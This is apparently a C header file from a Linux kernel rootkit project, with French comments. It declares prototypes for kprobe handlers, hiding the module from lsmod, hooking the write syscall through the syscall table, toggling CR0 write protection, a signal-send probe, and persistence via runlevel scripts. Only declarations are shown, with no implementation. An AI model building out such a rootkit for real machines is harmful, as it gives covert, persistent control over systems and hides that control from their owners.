#ifndef ROOTEST_H
#define ROOTEST_H

#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/module.h>

#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/namei.h>

// all libs
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <asm/uaccess.h>
#include <linux/proc_ns.h>
#include <linux/proc_fs.h>
#include <linux/file.h>
#include <linux/fdtable.h>
#include <linux/unistd.h>

// Fonctions de test kprobes
int kprobes_init(void);
void kprobes_exit(void);
int kprobe_handler(struct kprobe *p, struct pt_regs *regs);

// Prototype pour le gestionnaire de retour de kretprobe
int ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs);

// Déclaration externe des structs de probes pour utilisation dans les fichiers C
extern struct kretprobe rootkit_kretprobe;
extern struct kprobe sig_kp;

// Fonctions de dissimulation du module
void hide_from_lsmod(void);

// Probe sur l'envoi de signal aux processus
int handle_signal_send(struct kprobe *kp, struct pt_regs *regs);

// Hook sur syscall
asmlinkage int hook_write(struct pt_regs *regs);
int __init rootkit_init_hook(void);
void __exit rootkit_exit_hook(void);
inline void protect_memory(void);
inline void unprotect_memory(void);
inline void cr0_write(unsigned long cr0);
extern unsigned long * __sys_call_table;

// Persistence en ajoutant un script dans runlevels
void persistence_runlevels(void);

#endif 

